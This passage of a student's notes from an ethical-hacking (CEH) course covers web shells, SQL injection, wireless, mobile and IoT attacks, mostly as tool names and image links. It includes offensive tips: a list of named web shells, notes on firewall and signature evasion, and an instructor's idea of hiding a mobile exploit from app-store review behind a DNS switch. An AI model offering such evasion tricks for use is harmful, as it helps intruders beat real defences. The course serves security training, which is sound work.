class="toggle"><li><details open=""><summary>Other Attacks</summary><figure id="c6e86369-1be0-44ff-a0a9-9f134835645d" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2057.png"><img style="width:807.6420288085938px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2057.png"/></a></figure></details></li></ul><ul id="ec85777b-19af-4717-92cc-d11ab5f6df74" class="bulleted-list"><li style="list-style-type:disc">Watering Hole Attack (in the exam)</li></ul><ul id="563360f7-5aeb-4350-b8dc-3055d7450858" class="bulleted-list"><li style="list-style-type:disc">CSRF Attack</li></ul><ul id="2cca431d-baf3-4a7b-8e76-cef2c4561732" class="bulleted-list"><li style="list-style-type:disc">wafw00f<ul id="2fd6f94e-96be-48e9-ab68-60b7611708c3" class="bulleted-list"><li style="list-style-type:circle">detects if there is a waf</li></ul></li></ul><ul id="19e21270-7d09-43d3-9aa1-1fd8fba9dd1a" class="bulleted-list"><li style="list-style-type:disc">XML Bomb (in the exam)<ul id="09680a02-8e9c-4fa4-99cd-45418dc64d8a" class="bulleted-list"><li style="list-style-type:circle">exhausts resources and makes server crash</li></ul></li></ul><ul id="3d58e21a-a551-48f6-980e-19b0fd4a531f" class="bulleted-list"><li style="list-style-type:disc">Tools<ul id="22807754-cb1e-4488-93d0-eb8939539f23" class="bulleted-list"><li style="list-style-type:circle">SoapUI and XMLSpy are the most common tools</li></ul></li></ul><h3 id="9585b7d2-dee4-47a7-9618-7abadada5030" class="">Explain Web API, Webhooks, and Web Shell</h3><ul id="1c7f2d66-5a92-4126-b5b4-3c1970c3f135" class="bulleted-list"><li style="list-style-type:disc">Owasp zap - proxy to capture requests<ul id="a401bc93-cad0-4f95-b537-79f37a7907dd" class="bulleted-list"><li style="list-style-type:circle">also has http fuzzer with custom code and preview </li></ul></li></ul><ul id="111f9dcd-1b17-420a-a68f-0330530680d1" class="bulleted-list"><li style="list-style-type:disc">OWASP Web Hacking Guide<ul id="cb112ae8-f814-43c4-8278-ffec6fa251ae" class="bulleted-list"><li style="list-style-type:circle">a manual for hacking web applications</li></ul></li></ul><ul id="e0c4bc50-6a69-4a0d-a51e-6a64a24d2a82" class="bulleted-list"><li style="list-style-type:disc">REST API Vulnerability Scanning<ul id="6b95d548-54bc-4d57-9f59-7a80373aef5b" class="bulleted-list"><li style="list-style-type:circle">fuzzapi, w3af, appspider, vooki, owasp zap</li></ul><ul id="b3a5985a-caa6-432b-af98-07f44a726871" class="bulleted-list"><li style="list-style-type:circle">always choose a tool based on what you want to do and what it does</li></ul></li></ul><ul id="3f65fa9f-808f-4406-b3f0-fe0c41eb2197" class="bulleted-list"><li style="list-style-type:disc">SoapUI<ul id="73cfdf2a-244b-43cd-afb3-f20a85340c9a" class="bulleted-list"><li style="list-style-type:circle">one of the best that automates api testing</li></ul></li></ul><ul id="726e7b98-95cf-43a4-bd9e-4d89c347be5b" class="bulleted-list"><li style="list-style-type:disc">Web Shell Tools<ul id="b69fb7b8-0f3e-400b-b236-92f619d09562" class="bulleted-list"><li style="list-style-type:circle">WSO Php Webshell</li></ul><ul id="bf1e1a6d-dfee-4dbd-8ce2-0ff66979d954" class="bulleted-list"><li style="list-style-type:circle">Caterpillar WebShell</li></ul><ul id="032ed77b-5186-42be-9204-724972105e63" class="bulleted-list"><li style="list-style-type:circle">b374k</li></ul><ul id="b037288b-d38f-4677-92f0-26a3ce367c4c" class="bulleted-list"><li style="list-style-type:circle">china chopper</li></ul><ul id="37af089a-5561-4c52-af22-da79a0c829d8" class="bulleted-list"><li style="list-style-type:circle">c99</li></ul><ul id="3418f4d0-7ffc-438f-9e5d-b3b76be95c48" class="bulleted-list"><li style="list-style-type:circle">r57</li></ul></li></ul><p id="63130c40-7839-4b34-904c-fe26578dc3ec" class="">
</p><h3 id="ecb1b0d8-c445-4058-bf92-4430e9f02c5e" class="">Defending</h3><ul id="93c62b99-751f-4ca9-93ce-13653b8d3fe1" class="toggle"><li><details open=""><summary>Prevent webshells</summary><figure id="2bf8a9ab-9653-4828-8d4e-6f46e14af505" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2058.png"><img style="width:461.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2058.png"/></a></figure></details></li></ul><ul id="974c5f8a-2c4f-4027-804f-779a3a99fb2b" class="toggle"><li><details open=""><summary>API Security Risks and Solutions</summary><figure id="855fed93-3300-4e12-8678-100ed3b74d2d" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2059.png"><img style="width:461.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2059.png"/></a></figure></details></li></ul><ul id="1b5b5450-1588-4d90-87c0-623a775bb850" class="toggle"><li><details open=""><summary>Best Practices for API</summary><figure id="1101b57f-ba33-4b54-b1ca-7453120aabba" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2060.png"><img style="width:461.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2060.png"/></a></figure></details></li></ul><h3 id="d7f484bf-7fc9-4c85-866b-65c82c3864c6" class="">Summarize the Techniques used in Web Application Security</h3><ul id="1f4935f8-fd69-4dcc-b9a7-92026d39d6c9" class="bulleted-list"><li style="list-style-type:disc">Dynamic Web Application testing<ul id="ac039176-17e4-406c-98ba-fe3bc17e12af" class="bulleted-list"><li style="list-style-type:circle">cruicial for the exam</li></ul><ul id="a4e12702-671b-41b9-ae18-d024398372fc" class="bulleted-list"><li style="list-style-type:circle">BurpSuite, Accunetix - most seen tools</li></ul><ul id="31615c3e-2b15-4697-aa41-f5fb037c67a4" class="bulleted-list"><li style="list-style-type:circle">acunetix performs testing on hidden vulnerabilities also from the client side using a local client that monitors the server behaviour from that side</li></ul></li></ul></details></li></ul><ul id="5f60b34d-d6d5-4efc-9d25-779d2c15df55" class="toggle"><li><details open=""><summary>Module 15 - SQL Injection</summary><h3 id="24773730-216d-4505-a175-0280181a3e14" class="">Summarize SQL Injection Concepts</h3><ul id="35321dde-e85c-4bd5-8a21-ee38b40a839e" class="toggle"><li><details open=""><summary>Server Side Technologies for SQLi</summary><figure id="1b3dd1da-a9ad-4c0d-af12-918a870384bd" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2061.png"><img style="width:461.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2061.png"/></a></figure></details></li></ul><h3 id="f688986a-f093-454e-a136-abd78602a30c" class="">Demonstrate Various Types of SQL Injection Attacks</h3><ul id="c121efbc-5333-410d-acfd-1c06656c4200" class="toggle"><li><details open=""><summary>Attack examples</summary><figure id="3b422054-7aec-46df-b82c-2a141c7299e8" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2062.png"><img style="width:461.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2062.png"/></a></figure></details></li></ul><ul id="213426c2-1c12-46e2-bb98-209285d60294" class="toggle"><li><details open=""><summary>Types of SQL</summary><figure id="11a16bb7-3878-47c4-8265-cff156888096" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2063.png"><img style="width:461.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2063.png"/></a></figure></details></li></ul><h3 id="976d32b2-a858-436e-be56-5c70e00450e9" class="">Explain SQL Injection Methodology</h3><figure id="0082429f-3539-4e2d-8c6a-fc74cc3f7961" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2064.png"><img style="width:489.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2064.png"/></a></figure><figure id="aa560df3-5b4f-4176-882c-b19d0e88c879" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2065.png"><img style="width:489.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2065.png"/></a></figure><figure id="644e67ab-c4a7-4fef-8e92-a9227b755748" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2066.png"><img style="width:489.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2066.png"/></a></figure><p id="c4b9a86f-868e-4d05-acca-690cef099dee" class="">
</p><ul id="6fafeedb-b05d-4831-8aba-1d354b0a7607" class="toggle"><li><details open=""><summary>Blind SQL to extract user details - <strong>In the exam</strong></summary><figure id="f676ee81-7571-45a4-9118-a1848d634291" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2067.png"><img style="width:807.6420288085938px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2067.png"/></a></figure><figure id="00ea3ae8-4eec-47df-92a8-21faf64e4461" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2068.png"><img style="width:807.6420288085938px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2068.png"/></a></figure><figure id="bb7cb4ad-c4b5-45bf-990a-5e8f658e48c1" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2069.png"><img style="width:807.6420288085938px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2069.png"/></a></figure><figure id="353f68f8-1cdf-40d8-9451-da926c49df80" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2070.png"><img style="width:354px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2070.png"/></a></figure><p id="d52e0b34-3b2a-413b-9d1b-2c49d384ac36" class="">
</p></details></li></ul><h3 id="975a6083-a676-4c0d-af67-5828db4462ab" class="">Use SQL Injection Tools &amp; Methodologies</h3><ul id="57017ea2-aa21-4804-b1a7-f7aa2469aba0" class="toggle"><li><details open=""><summary>Databases have default tables and databases we can use these</summary><figure id="e5242e77-e053-46f9-9a53-32d8d14ea061" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2071.png"><img style="width:807.6420288085938px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2071.png"/></a></figure></details></li></ul><ul id="50d9dc95-7068-465f-8184-2af9fca6d183" class="toggle"><li><details open=""><summary>Other characteristics and features of different dbms</summary><figure id="93907d1d-0e57-4542-a6a5-33356a4ca4d0" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2072.png"><img style="width:807.6420288085938px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2072.png"/></a></figure></details></li></ul><ul id="cef40fcc-98ec-415e-8f7a-10f08e4ac82e" class="bulleted-list"><li style="list-style-type:disc">in the exam we see a certain table and we have to define what kind of source it is from</li></ul><ul id="6b54a720-b6f3-49f0-bf81-0cdd854a0f0a" class="toggle"><li><details open=""><summary>Bypass firewall</summary><figure id="168c9071-b530-41d8-bac0-6c9c0c9c8825" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2073.png"><img style="width:535px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2073.png"/></a></figure><figure id="2ad0ce76-0c4d-487e-b7da-e95066a5be52" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2074.png"><img style="width:807.6420288085938px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2074.png"/></a></figure></details></li></ul><ul id="7fc487e2-fd71-4a09-a40d-3606e1ac9e81" class="toggle"><li><details open=""><summary>transfer db to attackers machine</summary><figure id="87587176-2597-46c4-a512-f7a605544fcd" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2075.png"><img style="width:807.6420288085938px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2075.png"/></a></figure></details></li></ul><ul id="d7acb44f-5bf7-43cb-a05b-67370cb69158" class="bulleted-list"><li style="list-style-type:disc">MongoDB no sql injection is in the exam</li></ul><ul id="0789d7f7-8277-416a-a55b-a82044e770e8" class="bulleted-list"><li style="list-style-type:disc">Tools<ul id="ac0f027a-4a27-49e9-85e0-376b9856dca9" class="bulleted-list"><li style="list-style-type:circle">sqlmap and Mole</li></ul></li></ul><ul id="f6f067ba-4866-41b0-a900-cbef46ba5932" class="bulleted-list"><li style="list-style-type:disc">Manual creation of SQL queries is time consuming but sqlmap is noisy if they have an IDS so you have no choice</li></ul><ul id="d59d0346-dca8-47f0-8e41-f0f041e3f172" class="toggle"><li><details open=""><summary>Signature Evasion</summary><figure id="f3c10b80-65c6-477f-9953-5fc62ec68eee" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2076.png"><img style="width:807.6420288085938px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2076.png"/></a></figure></details></li></ul><h3 id="619252de-9ab5-430b-8721-6a70e5dd69a1" class="">Demonstrate Different Evasion Techniques</h3><ul id="af2f7de5-144a-4ec0-8a65-91ba857f5f4a" class="toggle"><li><details open=""><summary>Defending strategy</summary><figure id="d34c679c-9794-40cd-aa14-76ddd8d8437c" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2077.png"><img style="width:807.6420288085938px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2077.png"/></a></figure></details></li></ul><ul id="6d003263-9a2e-4fd5-b614-7f7a44b6cd37" class="toggle"><li><details open=""><summary>Defend methods</summary><figure id="211569c0-ff1f-4fa3-a828-b8f232fe2fea" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2078.png"><img style="width:807.6278076171875px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2078.png"/></a></figure></details></li></ul><ul id="7123efef-d944-4216-8ed9-8aec4a6ef948" class="bulleted-list"><li style="list-style-type:disc">Snort as IDS to detect sqli</li></ul><p id="a7476e76-0709-4ac7-953e-5ec82a9ad328" class="">
</p><h3 id="e9a5b923-7794-4908-8c5f-e291d25f763d" class="">Explain SQL Injection Countermeasure</h3><p id="f486c783-e0f4-44c7-9196-ea372e124adb" class="">
</p></details></li></ul><p id="335ef540-0b67-40f0-906e-e13b9f7e36c8" class="">
</p></div></details><details open=""><summary style="font-weight:600;font-size:1.875em;line-height:1.3;margin:0">Day 6 - SQLi, Wifi, Mobile, IoT, Cloud, Crypt</summary><div class="indented"><ul id="a4cc9a14-9bac-487f-94e9-d417ce500a21" class="toggle"><li><details open=""><summary>Recording</summary><figure id="ac9203e4-0032-4ba9-8e2a-a545c3581938"><div class="source"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/CEH_v12_Day_6_-_Modules_16_17_18_19_20.txt">CEH v12 Day 6 - Modules 16, 17, 18, 19, 20.txt</a></div></figure></details></li></ul><ul id="4e42ad45-760e-4daf-9eec-820a1c42e643" class="toggle"><li><details open=""><summary>Module 16 - Hacking Wireless Network</summary><h3 id="efdefd52-19e3-4e73-8c87-86d8bd9797c2" class="">Attacks</h3><ul id="ab5764ea-304e-448c-a56b-851d877e0bca" class="toggle"><li><details open=""><summary>Exam will be a question for the size of IV(initialization vector) bits for each wifi encryption type</summary><figure id="c763a108-4053-4cb0-9591-5375759f8bd9" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2079.png"><img style="width:461.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2079.png"/></a></figure></details></li></ul><ul id="ce347925-fe87-4716-b0c9-86f47cb38d62" class="toggle"><li><details open=""><summary>Issues with these protocols</summary><figure id="234e5529-9a00-4758-8d8a-9444100050b1" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2080.png"><img style="width:461.20001220703125px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2080.png"/></a></figure></details></li></ul><ul id="1f7a232d-9b7b-4326-84ac-3075904dd9f8" class="bulleted-list"><li style="list-style-type:disc">Cellphone jammer<ul id="97f384b1-3017-416d-b3aa-918104b1a369" class="bulleted-list"><li style="list-style-type:circle">illegal in eu, but works</li></ul><ul id="e567c3fd-e2c2-4c79-8405-970a53b246f7" class="bulleted-list"><li style="list-style-type:circle">you can also create it with parts</li></ul><ul id="173b9cb6-3007-4cc5-88aa-8bf39baa6a57" class="bulleted-list"><li style="list-style-type:circle">used by criminals that block car signals to identify where it is and notice the owners</li></ul></li></ul><ul id="31a1cd86-a100-42ac-a09b-376334585d85" class="bulleted-list"><li style="list-style-type:disc">KRACK Attack</li></ul><ul id="6571a2aa-77f0-4f21-92cf-037cd739baa4" class="bulleted-list"><li style="list-style-type:disc">Wifi Jamming Devices can be purchased online<ul id="bbf08307-ddd0-4885-870a-b29878c263c3" class="bulleted-list"><li style="list-style-type:circle">but illegal in the eu</li></ul></li></ul><ul id="a13e92c0-4af8-40dc-8023-3813516c864c" class="bulleted-list"><li style="list-style-type:disc">aLTEr Attack<ul id="7da78436-b6f9-42f1-b405-2f96e004f8ca" class="bulleted-list"><li style="list-style-type:circle">in the exam</li></ul><ul id="bd58bf3c-858e-4b50-8c40-d49bb1f492d3" class="bulleted-list"><li style="list-style-type:circle">happens today</li></ul><ul id="fc42b023-1308-40dc-b45a-a24b6656ccb1" class="bulleted-list"><li style="list-style-type:circle">enables man in the middle for sms messages</li></ul></li></ul><p id="418c65e7-5eee-4653-97b4-4a30e012a05b" class="">
</p><h3 id="0ada87ae-70d6-4b64-aa88-27c329b6bff8" class="">Methodology</h3><ul id="2e807b2b-fe46-4767-a416-355642a8cf12" class="bulleted-list"><li style="list-style-type:disc">its steps not phases,</li></ul><ul id="75b74d22-fb31-4996-bebd-766da0ad1f35" class="bulleted-list"><li style="list-style-type:disc">pentest method has methodology but in specific tasks like wifi its phases</li></ul><p id="d48db7a5-ebc5-4bfe-a720-bf2f2c96be3b" class="">
</p><p id="63703d42-bc2e-4b04-8e18-fde2f02333a6" class="">Step 1: Discovery<div class="indented"><ul id="60e7ed34-03af-4595-94f2-766e6e1d3e18" class="bulleted-list"><li style="list-style-type:disc">Passive and Active footprinting</li></ul><ul id="2fe6a33c-2893-49b1-add7-d7479f5f302a" class="bulleted-list"><li style="list-style-type:disc">putting the card in promiscous mode</li></ul><p id="c1930106-d25a-4ea0-99e9-a64156051030" class="">
</p><p id="355dfabc-872c-4b7e-a476-c8ae5412250e" class="">
</p></div></p><ul id="b7a120db-90e9-4b0d-bf4c-43f959f4d892" class="bulleted-list"><li style="list-style-type:disc">wigle.net<ul id="7c2597ed-2247-4850-919b-4aecbf25f74b" class="bulleted-list"><li style="list-style-type:circle">shows wifis in the area</li></ul><ul id="fdbd91ce-e1ca-4bf8-bab1-0164468047a2" class="bulleted-list"><li style="list-style-type:circle">others: skyhook, expertgps, gps visualizer</li></ul></li></ul><p id="2eb43b3c-233b-4ced-ad81-9b7dbf611d64" class="">
</p><ul id="e7355aa4-ffcf-4f8d-8aaf-3fa1f6558aa6" class="bulleted-list"><li style="list-style-type:disc">war driving<ul id="daeb223d-964b-4dd6-b86b-f4e178ef9f68" class="bulleted-list"><li style="list-style-type:circle">driving to find wifi signals over the city</li></ul></li></ul><ul id="6a2fae70-8394-42fb-b03b-dd60ed688a66" class="bulleted-list"><li style="list-style-type:disc">war flying<ul id="12c4f8e6-369b-4351-a1a0-ef0fc69d48b7" class="bulleted-list"><li style="list-style-type:circle">flying a drone to get wifi signals over the city</li></ul></li></ul><ul id="aee82aea-a16a-4fe3-9b81-b1b19649554d" class="bulleted-list"><li style="list-style-type:disc">aircrack-ng</li></ul><ul id="7911275e-e271-4182-b7cd-8fdc5d84630b" class="bulleted-list"><li style="list-style-type:disc">wifi-ids python script detects</li></ul></details></li></ul><ul id="7380fd5b-8ce2-436c-ae7d-1819aac076db" class="toggle"><li><details open=""><summary>Module 17 - Hacking Mobile Platforms</summary><ul id="6f73b1e9-e33a-4da2-a599-34fb3e9c3fe5" class="bulleted-list"><li style="list-style-type:disc">jolla - a Finish safe mobile phone system that is very secure<ul id="c8a6d8c8-3f0e-4111-9cd9-df74740162e9" class="bulleted-list"><li style="list-style-type:circle">Uses Sailfish OS, an os with built in privacy</li></ul><ul id="3974e2c1-7fff-412e-844c-292d9154ef39" class="bulleted-list"><li style="list-style-type:circle">identifies the owasp top 10 mobile risks</li></ul></li></ul><ul id="1c6c2482-8210-46d6-9370-d0d6109c1d48" class="bulleted-list"><li style="list-style-type:disc">Attack places<ul id="817299ff-4006-40d6-855f-20dbf032ebde" class="bulleted-list"><li style="list-style-type:circle">device, network, cloud</li></ul></li></ul><ul id="b782e490-ef71-49ab-be87-dc844a5be310" class="bulleted-list"><li style="list-style-type:disc">zANTI - needs root but you can do attacks</li></ul><ul id="36fe222d-37c5-4834-ab67-604c51cdffc1" class="bulleted-list"><li style="list-style-type:disc">DroidSheep - no root, evesdropping</li></ul><ul id="ff1d5619-fa54-4757-b601-146da8cb5050" class="bulleted-list"><li style="list-style-type:disc">immuniweb has option to upload a web app and it will analyze it<ul id="f0946d8c-2897-4e82-8e4f-8cde0ed6833e" class="bulleted-list"><li style="list-style-type:circle"><a href="http://mobsf.live">mobsf.live</a> too</li></ul></li></ul><ul id="8fd1725e-301c-441b-b612-373459a16161" class="bulleted-list"><li style="list-style-type:disc">someone created an app accidentally that when uploaded to google play, created a loop to the detection system that crashed it</li></ul><ul id="8454fd42-1dd9-47a0-9206-6489f459ebe4" class="bulleted-list"><li style="list-style-type:disc">to bypass google check, we might have a switch that activates the exploit only when installed or only in a specific condition so that its not detected<ul id="d125935a-b528-44fe-9307-bf60cae68239" class="bulleted-list"><li style="list-style-type:circle">he suggested a dns cname that exists only when we need to activate the exploit</li></ul></li></ul><ul id="89df02cc-bb0a-44b0-889a-da1f73dd3ad9" class="bulleted-list"><li style="list-style-type:disc">NextSpy, Spyzie</li></ul><ul id="869dea76-e277-48fb-9565-c70a80a4fd70" class="bulleted-list"><li style="list-style-type:disc">ManageEngine used to secure dvices, free for 25 devices</li></ul><ul id="7d23d0ba-0966-4136-a9e7-cd775d7d6fee" class="bulleted-list"><li style="list-style-type:disc">NowSecure is a vm you can use for reverse engineering on Ios<ul id="19c28c20-0781-4b83-b9cb-3f121579b0ad" class="bulleted-list"><li style="list-style-type:circle">also appuse from appsec is a virtual machine bur cheaper, can connect your physical phone to hack it<ul id="784374c5-f54e-42be-b257-3fcd2b5a0992" class="bulleted-list"><li style="list-style-type:square">also has tutorials its a good start for mobile jacking</li></ul></li></ul></li></ul><p id="c98b7440-d830-44e4-bb55-f23ac165ea60" class="">
</p></details></li></ul><ul id="de7623e6-c21a-4d2c-b27c-363d3b60a93b" class="toggle"><li><details open=""><summary>Module 18 - IoT and OT Hacking</summary><ul id="bbaf522b-b219-4d41-84b9-8000f87b205e" class="bulleted-list"><li style="list-style-type:disc">functionality, security, easy of use <ul id="c2376400-57f1-4217-acb6-d5663dabe7c2" class="bulleted-list"><li style="list-style-type:circle">balancing these is a struggle</li></ul><ul id="8733a769-42d6-41bd-8660-14e45ffa9c48" class="bulleted-list"><li style="list-style-type:circle">clients want functionality and ease of use</li></ul><ul id="86889755-26fb-44ca-8435-7c6dcd645284" class="bulleted-list"><li style="list-style-type:circle">but you can balance it by compromising security to provide the other two</li></ul><ul id="f7cc5c35-23f5-4477-86e7-10bec75ad8b3" class="bulleted-list"><li style="list-style-type:circle">but create composating controls to cover the security</li></ul><ul id="56bb315b-9c0c-44f7-81ff-5331d3d4cbf4" class="bulleted-list"><li style="list-style-type:circle"><strong>a hacker can take advantage of this and assume that if sth is very easy of use and very functional then it has lower security, so we can target these systems first instead of others</strong></li></ul></li></ul><h3 id="c8034251-e009-45e1-bac3-b503e73af709" class="">Summarize IoT Concepts</h3><ul id="c10bef20-a3cd-4039-bfac-91f7f1d38017" class="bulleted-list"><li style="list-style-type:disc">they are designed to be small simple and very easy to manage<ul id="4d0762db-003b-4e44-ba38-23ea3d4c3f64" class="bulleted-list"><li style="list-style-type:circle">so they dont have security</li></ul></li></ul><ul id="301795df-d861-4123-9c7f-6b978f789386" class="toggle"><li><details open=""><summary>Communication Models</summary><figure id="69a8d57d-c5cb-4527-bfdd-45f373f99bf3" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2081.png"><img style="width:535px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2081.png"/></a></figure></details></li></ul><ul id="58663799-cf82-4aa3-957c-520255ccb1ad" class="bulleted-list"><li style="list-style-type:disc">difficult to maintain because of the small cmputing sources<ul id="c1f8b9f3-1bb7-40f0-9444-c92e657010d0" class="toggle"><li><details open=""><summary>Challenges</summary><figure id="906d7713-b896-4e98-a819-f8b7b5e025de" class="image"><a href="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2082.png"><img style="width:779.6306762695312px" src="Certified%20Ethical%20Hacker%20Training%20-%20AKTINA%2030361f2bcdfd4669b6960d19bbb4da89/Untitled%2082.png"/></a></figure></details></li></ul></li></ul><ul id="ef0db37d-e231-42c7-baf5-1bb8b77065c6" class="bulleted-list"><li style="list-style-type:disc">EEPROM Chip<ul id="02ee1b7c-51dd-400b-8264-a1bac79e08ed" class="bulleted-list"><li style="list-style-type:circle">smart lamps have them</li></ul><ul id="2857e376-ce26-42c5-9dc1-c21417bf9591" class="bulleted-list"><li style="list-style-type:circle">is kind of a storage</li></ul><ul id="fc976543-dad4-476e-9f6d-12d531d64f16" class="bulleted-list"><li style="list-style-type:circle">physical access can enable manipulation</li></ul></li></ul><ul id="6b0b5d43-af23-4411-aa36-9c44fb284262" class="bulleted-list"><li style="list-style-type:disc">OWASP Top 10 Threats</li></ul><h3 id="bfa44a3f-2f1d-4673-9fd9-f0f7d0b1085b" class="">Explain IoT Attacks</h3><ul id="e6318e2f-6caf-4185-97a4-8f5215fe2c9a" class="bulleted-list"><li style="list-style-type:disc">flipper zero</li></ul><ul id="41232aac-5c33-4593-9e7f-8424d7ee4c36" class="bulleted-list"><li style="list-style-type:disc">pandawaRF<ul id="8f3878a6-9ef0-4743-88e7-7d2febdef92c" class="bulleted-list"><li style="list-style-type:circle">has hardcoted force generated codes for alarm systems</li></ul><ul id="04560ca7-3fa2-4f96-a30a-fd4c838286c3" class="bulleted-list"><li style="list-style-type:circle">brute forces so in some minutes it will do all the possibilities so sometime it will unlock</li></ul><ul id="ff4588bf-2f7b-44de-bf03-2d07cf026751" class="bulleted-list"><li style="list-style-type:circle">flipperzero doesnt have it</li></ul></li></ul><ul id="b7ae2bf6-7afd-4539-a9b7-35af3f42af27" class="bulleted-list"><li style="list-style-type:disc">modern car security systems use challenge response like kerberos authentication<ul id="e781ab03-8a84-4833-a7a6-56caebb64741" class="bulleted-list"><li style="list-style-type:circle">most cars however today don’t use challenge response because it takes up battery of the key</li></ul></li></ul><ul id="dd129f98-fe56-44cf-80ba-3e0ba20f5ec7" class="bulleted-list"><li style="list-style-type:disc">in keyless entry there is no signal<ul 